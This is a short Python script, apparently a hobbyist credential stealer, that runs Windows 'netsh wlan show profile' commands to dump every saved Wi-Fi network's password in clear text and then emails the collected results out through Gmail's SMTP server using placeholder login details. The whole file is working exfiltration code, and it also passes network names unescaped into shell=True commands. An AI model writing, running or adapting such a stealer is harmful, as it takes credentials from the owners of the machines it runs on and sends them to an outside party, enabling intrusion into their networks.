#!/usr/bin/env python
import subprocess, smtplib, re


def send_mail(email, password, message):
    # Creating SMTP server instance of gmail
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # Initiate TLS server
    server.starttls()
    # Login to email
    server.login(email, password)
    # Send mail
    server.sendmail(email, email, message)
    # Stopping the server
    server.quit()


# Declaring of string command
command = "netsh wlan show profile"
# Execute the command using subprocess
networks = subprocess.check_output(command, shell=True)
# Getting network names as list using regex
network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)

# Final result
result = ""
for network_name in network_names:
    # Getting each password of any wifi spot on pc
    command = "netsh wlan show profile " + network_name + " key=clear"
    # Execute the command using subprocess
    current_result = subprocess.check_output(command,shell=True)
    # Final string to send
    result = result + current_result

# Sending result by email
send_mail("example@gmail.com", "password", result)
